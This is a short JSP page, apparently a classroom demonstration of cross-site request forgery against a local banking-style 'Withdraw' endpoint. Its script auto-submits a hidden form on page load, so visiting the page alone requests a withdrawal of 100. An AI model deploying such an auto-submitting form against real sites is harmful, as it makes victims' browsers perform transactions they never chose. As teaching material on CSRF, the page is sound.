<%-- 
    Document   : badpage
    Created on : Feb 23, 2021, 8:47:10 AM
    Author     : root
--%>
<%@page session="false"%>

<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>CRSF - BAD PAGE</title>
    </head>
     <body>
        <h1>CRSF - BAD PAGE</h1>
        
        <!-- Just visiting this page causes a withdrawal! User doesn't even have to click on anything! -->
        
        <form action="http://localhost:8080/crsf/Withdraw" method="GET">
            <input type="text" name="amount" value="100">
        </form>
        
        <script type="text/javascript">
            //Auto-submit form telling application to withdraw funds
            document.forms[0].submit();
        </script>
    </body>
</html>
